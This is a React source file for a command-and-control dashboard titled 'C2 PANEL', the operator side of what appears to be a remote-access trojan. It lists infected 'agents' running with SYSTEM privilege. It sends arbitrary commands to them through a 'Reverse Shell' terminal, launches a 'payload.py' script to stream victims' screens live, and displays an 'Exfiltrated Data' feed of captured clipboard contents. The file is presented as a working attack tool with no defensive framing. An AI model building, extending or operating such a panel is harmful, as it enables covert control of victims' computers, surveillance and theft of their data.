"use client";

import React, { useState, useEffect } from "react";
import { 
  Users, 
  Terminal as TerminalIcon, 
  Clipboard, 
  Activity, 
  Cpu, 
  ShieldAlert, 
  Search,
  ChevronRight,
  Send,
  Loader2,
  RefreshCw,
  Clock
} from "lucide-react";
import { motion, AnimatePresence } from "framer-motion";

const API_BASE = "http://localhost:8000";

export default function Dashboard() {
  const [agents, setAgents] = useState([]);
  const [selectedAgent, setSelectedAgent] = useState(null);
  const [logs, setLogs] = useState([]);
  const [command, setCommand] = useState("");
  const [loading, setLoading] = useState(true);
  const [executing, setExecuting] = useState(false);
  const [sidebarOpen, setSidebarOpen] = useState(true);
  const [streaming, setStreaming] = useState(false);

  const toggleStream = async () => {
    if (!selectedAgent) return;
    const nextState = !streaming;
    setStreaming(nextState);
    
    // Command the agent to start/stop the payload script
    const cmd = nextState ? "python agent/payload.py" : "taskkill /F /IM python.exe /T";
    try {
      await fetch(`${API_BASE}/command/send`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ agentId: selectedAgent.id, command: cmd }),
      });
    } catch (error) {
      console.error("Failed to toggle stream", error);
    }
  };

  const fetchAgents = async () => {
    try {
      const res = await fetch(`${API_BASE}/agents`);
      const data = await res.json();
      setAgents(data);
      if (!selectedAgent && data.length > 0) {
        setSelectedAgent(data[0]);
      }
    } catch (error) {
      console.error("Failed to fetch agents", error);
    } finally {
      setLoading(false);
    }
  };

  const fetchLogs = async (hostname) => {
    try {
      const res = await fetch(`${API_BASE}/logs/${hostname}`);
      const data = await res.json();
      setLogs(data);
    } catch (error) {
      console.error("Failed to fetch logs", error);
    }
  };

  useEffect(() => {
    fetchAgents();
    const interval = setInterval(fetchAgents, 5000);
    return () => clearInterval(interval);
  }, []);

  useEffect(() => {
    if (selectedAgent) {
      fetchLogs(selectedAgent.hostname);
      const interval = setInterval(() => fetchLogs(selectedAgent.hostname), 3000);
      return () => clearInterval(interval);
    }
  }, [selectedAgent]);

  const sendCommand = async (e) => {
    e.preventDefault();
    if (!command || !selectedAgent || executing) return;

    setExecuting(true);
    try {
      await fetch(`${API_BASE}/command/send`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ agentId: selectedAgent.id, command }),
      });
      setCommand("");
      // Add a placeholder log or wait for the agent to execute
    } catch (error) {
      console.error("Failed to send command", error);
    } finally {
      setExecuting(false);
    }
  };

  const getStatusColor = (lastSeen) => {
    const last = new Date(lastSeen);
    const now = new Date();
    const diff = (now - last) / 1000;
    return diff < 60 ? "bg-emerald-500" : "bg-rose-500";
  };

  return (
    <div className="flex h-screen bg-zinc-950 text-zinc-100 font-sans selection:bg-rose-500/30">
      {/* Sidebar */}
      <motion.aside 
        initial={false}
        animate={{ width: sidebarOpen ? "320px" : "80px" }}
        className="border-r border-zinc-800 flex flex-col bg-zinc-950/50 backdrop-blur-xl relative z-10"
      >
        <div className="p-6 border-b border-zinc-800 flex items-center justify-between">
          {sidebarOpen && (
            <div className="flex items-center gap-3">
              <div className="p-2 bg-rose-500/10 rounded-lg">
                <ShieldAlert className="w-6 h-6 text-rose-500" />
              </div>
              <h1 className="font-bold text-xl tracking-tight">C2 PANEL</h1>
            </div>
          )}
          <button 
            onClick={() => setSidebarOpen(!sidebarOpen)}
            className="p-2 hover:bg-zinc-800 rounded-md transition-colors"
          >
            <Activity className="w-5 h-5 text-zinc-400" />
          </button>
        </div>

        <div className="flex-1 overflow-y-auto p-4 space-y-2">
          {loading ? (
            <div className="flex items-center justify-center py-10">
              <Loader2 className="w-6 h-6 animate-spin text-rose-500" />
            </div>
          ) : (
            agents.map((agent) => (
              <button
                key={agent.id}
                onClick={() => {
                  setSelectedAgent(agent);
                  setStreaming(false); // Reset stream when switching agents
                }}
                className={`w-full text-left p-3 rounded-xl transition-all duration-200 border ${
                  selectedAgent?.id === agent.id 
                    ? "bg-rose-500/10 border-rose-500/30 text-rose-50" 
                    : "border-transparent hover:bg-zinc-900 text-zinc-400"
                } flex items-center gap-3`}
              >
                <div className={`w-2.5 h-2.5 rounded-full ${getStatusColor(agent.last_seen)} shadow-[0_0_8px_rgba(244,63,94,0.4)]`} />
                {sidebarOpen && (
                  <div className="flex-1 truncate">
                    <p className="font-semibold text-sm truncate">{agent.hostname}</p>
                    <p className="text-[10px] opacity-60 uppercase tracking-widest">{agent.ip_address}</p>
                  </div>
                )}
                {sidebarOpen && <ChevronRight className="w-4 h-4 opacity-40" />}
              </button>
            ))
          )}
        </div>
      </motion.aside>

      {/* Main Content */}
      <main className="flex-1 flex flex-col overflow-hidden">
        {selectedAgent ? (
          <div className="flex-1 flex flex-col">
            {/* Header */}
            <header className="p-6 border-b border-zinc-800 bg-zinc-950/20 backdrop-blur-sm flex items-center justify-between">
              <div>
                <h2 className="text-2xl font-bold text-white">{selectedAgent.hostname}</h2>
                <div className="flex items-center gap-4 mt-1 text-sm text-zinc-500">
                  <span className="flex items-center gap-1.5 font-mono">
                    <Search className="w-3.5 h-3.5" />
                    {selectedAgent.ip_address}
                  </span>
                  <span className="flex items-center gap-1.5">
                    <Clock className="w-3.5 h-3.5" />
                    Last seen: {new Date(selectedAgent.last_seen).toLocaleTimeString()}
                  </span>
                </div>
              </div>
              <div className="flex gap-3">
                <button 
                  onClick={toggleStream}
                  className={`px-4 py-2 border rounded-lg text-sm font-medium transition-all ${
                    streaming 
                      ? "bg-rose-600 border-rose-500 text-white shadow-lg shadow-rose-900/20" 
                      : "bg-zinc-900 border-zinc-800 hover:border-zinc-700 text-zinc-300"
                  }`}
                >
                  {streaming ? "Stop Stream" : "Live Stream"}
                </button>
                <button className="px-4 py-2 bg-rose-600 hover:bg-rose-500 text-white rounded-lg text-sm font-medium transition-all shadow-lg shadow-rose-900/20">
                  Terminate
                </button>
              </div>
            </header>

            {/* Content Area */}
            <div className="flex-1 overflow-y-auto p-6 space-y-6">
              {/* Live Stream View */}
              {streaming && (
                <div className="w-full bg-black rounded-2xl border border-zinc-800 overflow-hidden relative group">
                  <img 
                    src={`${API_BASE}/stream/live?t=${Date.now()}`} 
                    alt="Live Stream" 
                    className="w-full h-auto max-h-[600px] object-contain mx-auto"
                  />
                  <div className="absolute top-4 left-4 flex items-center gap-2 bg-rose-600/80 backdrop-blur-md px-3 py-1.5 rounded-full text-[10px] font-bold tracking-widest uppercase">
                    <div className="w-2 h-2 bg-white rounded-full animate-pulse" />
                    LIVE
                  </div>
                </div>
              )}

              {/* Quick Stats */}
              <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                <div className="p-4 bg-zinc-900/50 border border-zinc-800 rounded-2xl flex items-center gap-4">
                  <div className="p-3 bg-blue-500/10 rounded-xl">
                    <Cpu className="w-6 h-6 text-blue-500" />
                  </div>
                  <div>
                    <p className="text-xs text-zinc-500 uppercase tracking-widest">CPU LOAD</p>
                    <p className="text-xl font-bold">2.4%</p>
                  </div>
                </div>
                <div className="p-4 bg-zinc-900/50 border border-zinc-800 rounded-2xl flex items-center gap-4">
                  <div className="p-3 bg-purple-500/10 rounded-xl">
                    <Activity className="w-6 h-6 text-purple-500" />
                  </div>
                  <div>
                    <p className="text-xs text-zinc-500 uppercase tracking-widest">MEM USAGE</p>
                    <p className="text-xl font-bold">42%</p>
                  </div>
                </div>
                <div className="p-4 bg-zinc-900/50 border border-zinc-800 rounded-2xl flex items-center gap-4">
                  <div className="p-3 bg-emerald-500/10 rounded-xl">
                    <Users className="w-6 h-6 text-emerald-500" />
                  </div>
                  <div>
                    <p className="text-xs text-zinc-500 uppercase tracking-widest">PRIVILEGE</p>
                    <p className="text-xl font-bold text-emerald-500 font-mono">SYSTEM</p>
                  </div>
                </div>
              </div>

              <div className="grid grid-cols-1 lg:grid-cols-2 gap-6 h-[500px]">
                {/* Terminal */}
                <div className="bg-zinc-900/80 border border-zinc-800 rounded-2xl flex flex-col overflow-hidden shadow-2xl">
                  <div className="p-4 border-b border-zinc-800 flex items-center gap-2 bg-zinc-900">
                    <TerminalIcon className="w-4 h-4 text-rose-500" />
                    <span className="text-xs font-bold uppercase tracking-widest opacity-60">Reverse Shell</span>
                  </div>
                  <div className="flex-1 p-4 font-mono text-sm overflow-y-auto space-y-2 bg-black/40">
                    <p className="text-zinc-600 italic">// Waiting for command input...</p>
                    {logs.filter(l => l.type === 'command_result').map((l, i) => (
                      <div key={i} className="space-y-1">
                        <p className="text-rose-400 prose-sm">$ {l.content.split('\n')[0]}</p>
                        <pre className="text-zinc-400 whitespace-pre-wrap">{l.content.split('\n').slice(1).join('\n')}</pre>
                      </div>
                    ))}
                  </div>
                  <form onSubmit={sendCommand} className="p-4 border-t border-zinc-800 bg-zinc-950 flex gap-2">
                    <div className="flex-1 flex items-center bg-zinc-900 border border-zinc-800 rounded-lg px-3 focus-within:border-rose-500/50 transition-all">
                      <span className="text-rose-500 mr-2">$</span>
                      <input 
                        value={command}
                        onChange={(e) => setCommand(e.target.value)}
                        placeholder="Type a command..." 
                        className="bg-transparent border-none focus:ring-0 text-sm w-full py-2 outline-none"
                      />
                    </div>
                    <button 
                      disabled={executing}
                      className="p-2 bg-rose-600 hover:bg-rose-500 disabled:opacity-50 rounded-lg transition-colors"
                    >
                      {executing ? <Loader2 className="w-5 h-5 animate-spin" /> : <Send className="w-5 h-5" />}
                    </button>
                  </form>
                </div>

                {/* Exfiltrated Data */}
                <div className="bg-zinc-900/80 border border-zinc-800 rounded-2xl flex flex-col overflow-hidden">
                  <div className="p-4 border-b border-zinc-800 flex items-center justify-between bg-zinc-900">
                    <div className="flex items-center gap-2">
                      <Clipboard className="w-4 h-4 text-emerald-500" />
                      <span className="text-xs font-bold uppercase tracking-widest opacity-60">Activity Stream</span>
                    </div>
                    <RefreshCw className="w-3.5 h-3.5 text-zinc-500 cursor-pointer hover:rotate-180 transition-all duration-500" />
                  </div>
                  <div className="flex-1 overflow-y-auto divide-y divide-zinc-800/50">
                    {logs.length > 0 ? logs.map((log) => (
                      <div key={log.id} className="p-4 hover:bg-zinc-800/30 transition-colors">
                        <div className="flex items-center justify-between mb-1">
                          <span className={`text-[10px] font-bold px-1.5 py-0.5 rounded uppercase ${
                            log.type === 'clipboard' ? 'bg-emerald-500/10 text-emerald-500' : 'bg-blue-500/10 text-blue-500'
                          }`}>
                            {log.type}
                          </span>
                          <span className="text-[10px] text-zinc-600">{new Date(log.createdAt).toLocaleTimeString()}</span>
                        </div>
                        <p className="text-sm text-zinc-300 break-words leading-relaxed">{log.content}</p>
                      </div>
                    )) : (
                      <div className="flex flex-col items-center justify-center h-full text-zinc-500 opacity-40 italic py-20">
                        No exfiltrated data yet
                      </div>
                    )}
                  </div>
                </div>
              </div>
            </div>
          </div>
        ) : (
          <div className="flex-1 flex flex-col items-center justify-center p-12 text-center text-zinc-600">
            <div className="w-20 h-20 bg-zinc-900 rounded-3xl flex items-center justify-center mb-6 border border-zinc-800">
              <ShieldAlert className="w-10 h-10" />
            </div>
            <h3 className="text-2xl font-bold text-zinc-400 mb-2">No Agent Selected</h3>
            <p className="max-w-xs mx-auto">Select an active agent from the sidebar to start monitoring and remote management.</p>
          </div>
        )}
      </main>
    </div>
  );
}